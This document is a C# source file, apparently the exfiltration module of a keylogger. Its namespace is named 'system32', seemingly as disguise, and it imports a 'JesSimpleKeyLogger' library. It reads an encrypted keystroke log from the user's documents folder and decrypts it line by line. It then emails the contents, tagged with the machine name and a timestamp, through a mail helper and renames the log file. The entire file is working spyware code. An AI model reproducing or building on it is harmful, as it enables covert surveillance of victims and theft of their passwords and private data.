using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using JesSimpleKeyLogger;

namespace system32
{
    class decrypt
    {
        public static void decr()
        {
            string str = "";
            StreamReader sr = new StreamReader(@"c:\\Мои документы\ey\sys", Encoding.GetEncoding(1251));
           // StreamWriter sw = new StreamWriter(@"d:\\pass.txt", false, Encoding.GetEncoding(1251));
            string[] buf = new string[10000];
            for (int i = 0; i < 10000; i++)
            {
                buf[i] = sr.ReadLine();
                if (buf[i] != null)
                {
                    if (buf[i] != "")
                    {
                        buf[i] = encryption.Decrypt(buf[i]);

                    }
                }
                str = str + buf[i];
            }
            
            sr.Close();
            string date_now = DateTime.Now.Date.ToString();
            string time_now = DateTime.Now.Hour.ToString() + ":" + DateTime.Now.Minute.ToString() + ":" + DateTime.Now.Second.ToString();
            string name = Environment.MachineName.ToString();
            string temaaa = name + " " + date_now + " " + time_now;
            mail.SendMail(temaaa,str);
           // File.Move(@"d:\\work\key\ext451dll.dll", @"d:\\work\key\"+time_now+".dll");

            DirectoryInfo d = new DirectoryInfo(@"c:\\Мои документы\ey\");
            
                // Do the renaming here
            File.Move(Path.Combine(d.ToString(), "sys"), Path.Combine(d.ToString(),time_now+""));
            
        }
    }
}
